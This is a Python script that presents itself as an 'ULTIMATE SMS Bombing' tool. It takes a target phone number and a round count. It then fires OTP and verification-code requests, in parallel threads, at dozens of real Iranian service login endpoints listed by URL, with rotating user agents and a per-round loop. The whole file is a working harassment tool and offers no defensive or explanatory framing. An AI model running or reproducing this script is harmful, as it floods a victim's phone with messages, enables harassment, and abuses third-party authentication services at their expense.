import requests
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor

BANNER = """
\033[1;31m
  _ ______   _______  ______    ___   _  __    _  ___   _______  __   __  _______  _______  _______  _______  _______ 
|      | |   _   ||    _ |  |   | | ||  |  | ||   | |       ||  | |  ||       ||  _    ||  _    ||       ||  _    |
|  _    ||  |_|  ||   | ||  |   |_| ||   |_| ||   | |    ___||  |_|  ||_     _|| | |   || | |   ||___    || | |   |
| | |   ||       ||   |_||_ |      _||       ||   | |   | __ |       |  |   |  | | |   || | |   |    |   || | |   |
| |_|   ||       ||    __  ||     |_ |  _    ||   | |   ||  ||       |  |   |  | |_|   || |_|   |    |   || |_|   |
|       ||   _   ||   |  | ||    _  || | |   ||   | |   |_| ||   _   |  |   |  |       ||       |    |   ||       |
|______| |__| |__||___|  |_||___| |_||_|  |__||___| |_______||__| |__|  |___|  |_______||_______|    |___||_______|

                [ sms cafe code ] 
\033[0m
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def get_api_map(number):

    num_with_0 = '0' + number
    num_with_98 = '98' + number[1:] if number.startswith('0') else '98' + number
    num_plus_98 = '+' + num_with_98

    return {

        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': num_with_0}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': num_with_0}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': num_with_0}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': num_with_0}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': num_with_0, 'userType': 'PATIENT'}),
        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': num_with_0}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': num_plus_98}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': num_with_0}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'user', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': num_with_0}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': num_with_0, 'captcha': ''}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': num_with_0}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': num_with_0}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': num_with_0, 'captcha': ''}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': num_with_0, 'redirectUrl': ''}),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {'type': 1, 'value': num_with_0}),
        'filmnet': (f'https://filmnet.ir/api-v2/access-token/users/{num_with_0}/otp', None),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': num_plus_98}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': num_with_0}),
        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {'country_id': 205, 'mobile': number}),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {'backUrl': '/', 'username': num_with_0, 'otp_call': 'false'}),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {'mobile': num_with_0, 'deviceTypeCode' :0, 'confirmTerms': 'true', 'notRobot': 'false'}),
        'estadaad': ('https://api.estadaad.com/api/v1/auth/send-otp', {'mobile': num_with_0}),
        'tapsell': ('https://api.tapsell.com/v1/auth/otp', {'mobile': num_with_0}),
        'digi-pay': ('https://api.digipay.ir/api/v1/auth/otp', {'mobile': num_with_0}),


        'snapp_v1': ('https://api.snapp.ir/api/v1/sms/link', {'phone': num_with_0}),
        'snapp_v2': (f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={num_with_0}", {'cellphone': num_with_0}),
        'achareh': ('https://api.achareh.co/v2/accounts/login/', {'phone': num_with_98}),
        'zigap': ('https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp', {'phoneNumber': num_plus_98}),
        'jabama': ('https://gw.jabama.com/api/v4/account/send-code', {'mobile': num_with_0}),
        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': num_with_0}),
        'classino': ('https://student.classino.com/otp/v1/api/login', {'mobile': num_with_0}),
        'digikala_v1': ('https://api.digikala.com/v1/user/authenticate/', {'username': num_with_0, 'otp_call': False}),
        'digikala_v2': ('https://api.digikala.com/v1/user/forgot/check/', {'username': num_with_0}),
        'sms_ir': ('https://appapi.sms.ir/api/app/auth/sign-up/verification-code', num_with_0),
        'alibaba': ('https://ws.alibaba.ir/api/v3/account/mobile/otp', {'phoneNumber': number}),
        'divar': ('https://api.divar.ir/v5/auth/authenticate', {'phone': num_with_0}),
        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': num_with_0}),
        'bikoplus': ('https://bikoplus.com/account/check-phone-number', {'phoneNumber': num_with_0}),
        'mootanroo': ('https://api.mootanroo.com/api/v3/auth/send-otp', {'PhoneNumber': num_with_0}),
        'tap33': ('https://tap33.me/api/v2/user', {'credential': {'phoneNumber': num_with_0, 'role': 'BIKER'}}),
        'tapsi': ('https://api.tapsi.ir/api/v2.2/user', {'credential': {'phoneNumber': num_with_0, 'role': 'DRIVER'}, 'otpOption': 'SMS'}),
        'gapfilm': ('https://core.gapfilm.ir/api/v3.1/Account/Login', {'Type': '3', 'Username': number}),
        'itoll_new': ('https://app.itoll.com/api/v1/auth/login', {'mobile': num_with_0}),
        'anargift': ('https://api.anargift.com/api/v1/auth/auth', {'mobile_number': num_with_0}),
        'nobat': ('https://nobat.ir/api/public/patient/login/phone', {'mobile': number}),
        'lendo_new': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': num_with_0}),
        'hamrah_mechanic': ('https://www.hamrah-mechanic.com/api/v1/membership/otp', {'PhoneNumber': num_with_0}),
        'abantether': ('https://abantether.com/users/register/phone/send/', {'phoneNumber': num_with_0}),
        'okcs': ('https://my.okcs.com/api/check-mobile', {'mobile': num_with_0}),
        'tebinja': ('https://www.tebinja.com/api/v1/users', {'username': num_with_0}),
        'bit24': ('https://bit24.cash/auth/bit24/api/v3/auth/check-mobile', {'mobile': num_with_0}),
        'rojashop': ('https://rojashop.com/api/send-otp-register', {'mobile': num_with_0}),
        'paklean': ('https://client.api.paklean.com/download', {'tel': num_with_0}),
        'khodro45': ('https://khodro45.com/api/v1/customers/otp/', {'mobile': num_with_0}),
        'delino': ('https://www.delino.com/user/register', {'mobile': num_with_0}),
        'digikalajet': ('https://api.digikalajet.ir/user/login-register/', {'phone': num_with_0}),
        'miare': ('https://www.miare.ir/api/otp/driver/request/', {'phone_number': num_with_0}),
        'dosma': ('https://app.dosma.ir/api/v1/account/send-otp/', {'mobile': num_with_0}),
        'ostadkr': ('https://api.ostadkr.com/login', {'mobile': num_with_0}),
        'sibbazar': ('https://sandbox.sibbazar.com/api/v1/user/invite', {'username': num_with_0}),
        'shab': ('https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile', {'mobile': num_with_0}),
        'bitpin': ('https://api.bitpin.org/v2/usr/signin/', {'phone': num_with_0}),
        'taaghche': ('https://gw.taaghche.com/v4/site/auth/signup', {'contact': num_with_0}),
    }

def send_single_request(item):
    name, (url, payload) = item
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if payload:

            if isinstance(payload, dict):
                response = requests.post(url, json=payload, headers=headers, timeout=4)
            else:
                response = requests.post(url, data=payload, headers=headers, timeout=4)
        else:
            response = requests.get(url, headers=headers, timeout=4)

        if response.status_code in [200, 201, 202]:
            print(f"\033[1;32m[+] {name}: Sent!\033[0m")
            return True
        else:
            print(f"\033[1;31m[-] {name}: Failed ({response.status_code})\033[0m")
    except:
        print(f"\033[1;31m[-] {name}: Error!\033[0m")
    return False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    target_number = input("\033[1;32mTarget Number (without 0 or +98): \033[0m")
    try:
        rounds = int(input("\033[1;32m[?] Enter Number of Rounds: \033[0m"))
    except ValueError:
        print("\033[1;31m[-] Invalid number of rounds!\033[0m")
        return

    api_map = get_api_map(target_number)
    targets = list(api_map.items())

    print(f"\n\033[1;36m[*] Starting ULTIMATE SMS Bombing on {target_number} for {rounds} rounds...\033[0m")
    time.sleep(1)

    total_sent = 0
    for r in range(1, rounds + 1):
        print(f"\n\033[1;33m--- Round {r} ---\033[0m")

        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(send_single_request, targets))
            total_sent += sum(results)

        time.sleep(0.5)

    print(f"\n\033[1;32m[#] Attack Finished! Total SMS requests sent: {total_sent}\033[0m")

if __name__ == "__main__":
    main()
  
